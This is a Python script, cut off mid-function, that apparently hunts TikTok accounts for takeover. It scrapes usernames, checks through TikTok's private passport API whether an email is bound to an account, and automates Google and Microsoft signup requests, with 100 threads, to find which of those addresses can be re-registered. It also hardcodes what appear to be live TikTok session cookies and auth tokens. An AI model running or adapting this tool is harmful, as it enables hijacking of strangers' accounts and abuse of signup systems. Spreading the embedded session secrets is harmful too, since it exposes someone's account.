from requests import get,post
from random import choice,randrange
from threading import Thread
import os,sys,uuid
import http.client
import requests
import re, uuid
import time
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import multiprocessing
import re
import random
import os,requests,sys,time,datetime

P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
col = P,B,O,Z,X,F,L,C,A,P,J,J1,J2,J21,J22,F1,C1,P1,P2,
nn = random.choice(col)

class mortada:
  def __init__(self):
    self.good_tiktok=0
    self.bad_tiktok=0
    self.good_gmail=0
    self.bad_gmail=0
    self.nudes=[]
    self.hits=[]
    self.list=[]
    self.cok=[]
    self.ttwids=[]
    self.msTokens=[]
    os.system('clear' if os.name == 'posix' else 'cls')
    self.token= input(f" |{J21}•{P}> {J21}Token {P}: ")
    os.system('clear' if os.name == 'posix' else 'cls')
    self.id= input(f" |{J21}•{P}>{J21} ID {P}:")
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f'{C1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f' {X}[{F}1{X}]{C1} Gmail - {X}[{F}2{X}]{C1} Hotmail')
    print(f'{C1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

    print('')
    xx = input(f" {P1}-{Z}×{P1}- SELET :  ")


    os.system('clear' if os.name == 'posix' else 'cls')    
    for _ in range(100):
        Thread(target=self.home, args=(xx)).start()    



  def get_users(self):
    while True:
      try:
        usernames=[]
        g=choice(
          ['دجحخهعغفقثصضشسيبلاتنمكطظزوةىلارؤءئ',
           'azertyuiopmlkjhgfdsqwxcvbn',
           'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
           'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん']
        )
        keyword=''.join((choice(g) for i in range(randrange(3,15))))
        headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'dnt': '1',
                'origin': 'https://livecounts.io',
                'priority': 'u=1, i',
                'referer': 'https://livecounts.io/',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
            }
        response = get('https://tiktok.livecounts.io/user/search/'+str(keyword), headers=headers).json()['userData']
        for user in response:
          username=user['id']
          if '_' not in username:
                      if username not in self.list:
                          if len(username) > 5:
                          	self.list.append(username)
                          	usernames.append(username)
        return usernames
      except Exception as e:''


  

  def check_linked(self,email):
    email = str(email)
    while True:
      try:
        url = 'https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=19&iid=7372841843832473349&device_id=7194351170030650885&ac=WIFI&channel=googleplay&aid=1233&app_name=musical_ly&version_code=310503&version_name=31.5.3&device_platform=android&os=android&ab_version=31.5.3&ssmix=a&device_type=Infinix+X6816&device_brand=Infinix&language=ar&os_api=30&os_version=11&openudid=3293d1a6e9361cb7&manifest_version_code=2023105030&resolution=720*1568&dpi=303&update_version_code=2023105030&_rticket=1722418820230&is_pad=0&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi5g&uoo=0&op_region=IQ&timezone_offset=10800&build_number=31.5.3&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=ar%2C&ts=1722418819&cdid=556d8162-2721-4760-a509-a92b3cf27738&support_webview=1&cronet_version=2fdb62f9_2023-09-06&ttnet_version=4.2.152.11-tiktok&use_store_region_cookie=1'
        headers = {
    "Host": "api22-normal-c-alisg.tiktokv.com",
    "Content-Length": "95",
    "Cookie": (
        "passport_csrf_token=98153892f65b8d33f0fc4ffe571fe6ff; "
        "passport_csrf_token_default=98153892f65b8d33f0fc4ffe571fe6ff; "
        "d_ticket=9281ab6b344229e79a37b09d997ffd31c1a0f; "
        "multi_sids=7276401311359534085%3A14a2ae47be8dc51939df2969e4159dae%7C7320680702445503493%3A7a7e5835dfc5299e7ac584e090f6e8e2; "
        "cmpl_token=AgQQAPOGF-RPsLTEFtdG9108-bbhdjiI_4csYNYVRg; "
        "uid_tt=2507bbf000c73643b0480fdda21ecfd3015ddb85664c0a9ec8744a812eb35856; "
        "uid_tt_ss=2507bbf000c73643b0480fdda21ecfd3015ddb85664c0a9ec8744a812eb35856; "
        "sid_tt=14a2ae47be8dc51939df2969e4159dae; "
        "sessionid=14a2ae47be8dc51939df2969e4159dae; "
        "sessionid_ss=14a2ae47be8dc51939df2969e4159dae; "
        "store-country-code=tr; "
        "store-country-code-src=uid; "
        "install_id=7372841843832473349; "
        "ttreq=1$95ba7cef3ab3446401e85f477fec283b1f0356ed; "
        "tt-target-idc-sign=znspePrEB2B5KD8K2lCDdggj4Lrw0uZD8o8bYY-w9vx1Z9klJbqvQgGeyl3E8sUGqwqHik_mH1KG6A5VVp__l3LlnWqVrDfjEzg9pcMtVEorYAHJ6Toep-EcMgXE-xS-3cOJwT1Qf5BUZiBoSeg0tnnZBVNK1JsWC-ntQlEGynwHnHW9i027cg1PQ3-umOPXjgbV1OEixU38LwPGQbJWkuX7v8RyMxVp3THNii4nXtbAvhBR7bm_o1VhlMlMn40SQuT9R8yWkQc6RL-HjDh_vLmUg4u1cbQddaqFaV9_m3xSMN96XIWp6MnyF052aO4xZHu9FKbDv_at-nQYCGW-cQKbnnyE69dDs0TE5kW9UT8reh6ZBsjJksItUaixkcAXkyMmkZkceMyRDkUvzTQm2PrsZP9QaKFGKnJJZx54L5wXWJfvRVQgvi0Ww3yzNbSo5h_k989r0nnMBlO8ukkfznwf5KrceuLTfncX1WQ9LVQkzQUhhmv9OOpgCdekXT5C; "
        "store-idc=alisg; "
        "tt-target-idc=alisg; "
        "odin_tt=4dfb813064a0a02517fb0dd3c1009e809bf0ce448947afa034d0e32c795874310203125b5dbae1bc50184a186676c5036593fa5d3ac1d8bff3c8fd7eec825de0b6faf9abdc1bdba28833e68fef89b1f1; "
        "sid_guard=14a2ae47be8dc51939df2969e4159dae%7C1722418253%7C15552000%7CMon%2C+27-Jan-2025+09%3A30%3A53+GMT; "
        "msToken=-7MZX1FGwui41BUSmMF7rmPZte5XSTuOPjeS9D4x3s_4H_ipjHFhhVAgIwDftSWW_3gcy5E2dlCVmid0AQKv9VxfDjtlODra8cMmfK67iolTKbCX_MU0YxgpWnM="
    ),
    "x-tt-multi-sids": "7276401311359534085%3A14a2ae47be8dc51939df2969e4159dae%7C7320680702445503493%3A7a7e5835dfc5299e7ac584e090f6e8e2",
    "sdk-version": "2",
    "x-bd-kmsv": "0",
    "x-tt-token": "0302679db7ae064403e13f425475ec5481032fcbdaa1e0694afe7afbe631de14116fc4c8d76513b8ed96672cf4357f819c7c44384f48fdc2221892fb991c41ca16ba39fd45660fe87bb67135e56ab13599a232256df011c35928fe47cee3d44718025-CkAxZWRiNmY0NjYzZTI5Nzc4ZDUzMjFlYzY4ODEyNGMxZTE0Zjc5NjBlNzc4NTM5Nzg5NDNmNDhjYzg2OGNjNmRh-2.0.0",
    "x-ss-req-ticket": "1722418820234",
    "multi_login": "1",
    "x-tt-passport-csrf-token": "98153892f65b8d33f0fc4ffe571fe6ff",
    "passport-sdk-version": "19",
    "x-tt-dm-status": "login=1;ct=1;rt=1",
    "x-vc-bdturing-sdk-version": "2.3.3.i18n",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-ss-stub": "EF371AB22B36112B4E3777D59B57E7BF",
    "x-ss-dp": "1233",
    "x-tt-trace-id": "00-082976481063d778459717c605a804d1-082976481063d778-01",
    "User-Agent": "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 11; ar_IQ; Infinix X6816; Build/RP1A.200720.011; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)",
    "Accept-Encoding": "gzip, deflate, br",
    "x-argus": "hYHSZacQ+SDgjlhp+GYTPATrp4KSxeMsHQySzlh5C4d7w07Cy/3kgo5M8Z2xffqwtvplj4D9mpyLjkrSxhYMrnMxuUo+zjWEC1vnuYSJ6SCnx3jNNrpAMGoJLptuSLDI32yTtCAF6I2CRxlfM3sDQFE++w5/cLMuNPH7oZMoC7hdF+oSimYO1yKIofoIa42nGjcHeES/wlmeYELVLE8jP7Zv9Y96TnziC3CLUL5rgwNisVnl+myJ7Om7f1ee/NEITKCB02v6dWxBdevWv6YU8xbar/XFgay1xjOqau6hAhBfl2zlGLI2GCcFuO0awp/76qFrUVspD5kJFIknREqMZuBZc7XwrGL1zBG2i2dLJ0L8xlf7nnXNJDcHaYJN/k2fgk20670sTHMwSU/2n3qjuoFnlmRvBtkbK9aZhXK6UsZBc7wfXFGtvo7mMEFNMx0bGBXeV0W3nMFUEBvQ8DSyz1sR8cX/TgcXki8fqv66hzqv7gKnoCpVg4DJLPX8BCoaCmbF8E8wY2I8LINdnUnCS171hAApx2OVCtdRChfZO2vm3aVH3FSpLZ7+3IiFmeFFqNnSiP3WFGPkZLjQzLcryRGN6okMTWYmzI8WEmD917+0rCVT1BGBeaz7y6376Hf0oaA=",

    "x-gorgon": "8404d0be100059d8c5deec6af320f9083a816ca0b153a10453d5",
    "x-khronos": "1722418817",
    "x-ladon": "AjUiHZeEpusLBby98MCwh8Po6zMm5xpdn8owe0nCNu1wuUYq"
}
        
        data = {
    "account_sdk_source": "app",
    "multi_login": "1",
    "email_source": "9",
    "email": email,
    "mix_mode": "1"
}
        res = requests.post(url,headers=headers,data=data).text
        if "فشل في الربط، تم ربط صندوق البريد بالحساب الآخر"in res:          
          return True
        else:
          return False
      except:''

  def get_tokens(self):
      while True:
        try:
          g=self.gg00()['tokens']
          TL=g['TL']
          __Host_GAPS=g['__Host-GAPS']
          at=g['at']
          hl=g['hl']
          s1=g['s1']
          try:
            os.remove(f'tokens.txt')
          except:''
          with open(f'tokens.txt','a') as a:
            a.write(f'{TL}///{__Host_GAPS}///{at}///{hl}///{s1}')
          return 
        except Exception as e:''
  def gg00(self):
        ua=str(generate_user_agent())
        time0=time.time()
        conn = http.client.HTTPSConnection('accounts.google.com')
        while True:
            try:
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
    }
                conn.request(
        'GET',
        '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
        headers=headers
    )
                response = conn.getresponse().info()
                __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
                tl=str(response).split('TL=')[1].split('\n')[0]
                break
            except Exception as e:''
        while True:
            try:
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent':  ua,
    }
                response = requests.get(
        'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
        cookies=cookies,
        headers=headers,
    )
                tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
                hl=tok[0]
                s1=tok[28]
                at=tok[33]
                break
            except Exception as e:''
        while True:
            try:
                name=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn') for i in range(randrange(4,13)))
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': hl,
        'TL': tl,
    }
                data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        while True:
            try:
                yaer=str(randrange(1980,2007))
                month=str(randrange(1,12))
                day=str(randrange(1,28))
                cookies = {
        '__Host-GAPS': __Host_GAPS
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': hl,
        'TL': tl,
    }

                data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEcIsRVixEyLwSRrl-UsP-MSM8LflbsVQbuiwLQLEbJLFMSlolNVvrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwiGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP-nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl-RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp-LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZRdDgesg8pQ9R-5_yAhQc67C1CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxo3Gdlx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHj4LTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        tm=time.time()-time0
        try:
            return {
                'tokens':{
                    '__Host-GAPS':__Host_GAPS,
                    'TL':tl,
                    'hl':hl,
                    'at':at,
                    's1':s1,
                },
                'info':{
                    'name':name,
                    'birthday':{
                        'day:month:year':day+':'+month+':'+yaer,
                        'day':day,
                        'month':month,
                        'year':yaer,
                    },
                    'time_get_tokens':tm,
                    'time':time.time(),               
                        },
                'errors':[],
            }
        except:
            return {
                'errors':['error get tokens'],
                'tokens':{

                },
                'info':{
                    'time':time.time(),
                    'time_get_tokens':tm,
                },
            }
  def check_tokens(self):
      while True:
        try:
          try:
            o=open('tokens.txt','r').read().splitlines()[0].split('///')
            TL=o[0]
            __Host_GAPS=o[1]
            at=o[2]
            hl=o[3]
            s1=o[4]
          except Exception as e:
            self.get_tokens()
            return
          email=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn1234567890.') for i in range(randrange(10,15)))
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            return
          else:
            self.get_tokens()
            return
        except Exception as e:''
  def check_gmail(self,email):
      while True:
        try:
          if '@' in email:email=email.split('@')[0]
          self.check_tokens()
          o=open('tokens.txt','r').read().splitlines()[0].split('///')
          TL=o[0]
          __Host_GAPS=o[1]
          at=o[2]
          hl=o[3]
          s1=o[4]
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            return True
          else:
            return False
        except Exception as e:''
  def check_hotmail(self,email):
    while True:
      try:

        headers = {
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'accept-language': 'en-US,en;q=0.9',
  'upgrade-insecure-requests': '1',
  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
        response = requests.get('https://signup.live.com/signup', headers=headers)
        canary=str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
        amsc=response.cookies.get_dict()['amsc']
        cookies = {
  'amsc': amsc,
}
        headers = {
  'accept': 'application/json',

  'accept-language': 'en-US,en;q=0.9',
  'canary': canary,
  'content-type': 'application/json; charset=utf-8',
  'origin': 'https://signup.live.com',
  'referer': 'https://signup.live.com/',
  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}        
        json_data = {
  'clientExperiments': [
      {
          'parallax': 'enableplaintextforsignupexperiment',
          'control': 'enableplaintextforsignupexperiment_control',
          'treatments': [
              'enableplaintextforsignupexperiment_treatment',
          ],
      },
  ],
}       
        response = requests.post(
  'https://signup.live.com/API/EvaluateExperimentAssignments',
  cookies=cookies,
  headers=headers,
  json=json_data,
).json()
        canary=response['apiCanary']
        cookies = {
  'amsc': amsc,
}
        headers = {
  'accept': 'application/json',
  'accept-language': 'en-US,en;q=0.9',
  'canary': canary,
  'content-type': 'application/json; charset=utf-8',
  'origin': 'https://signup.live.com',
  'referer': 'https://signup.live.com/',
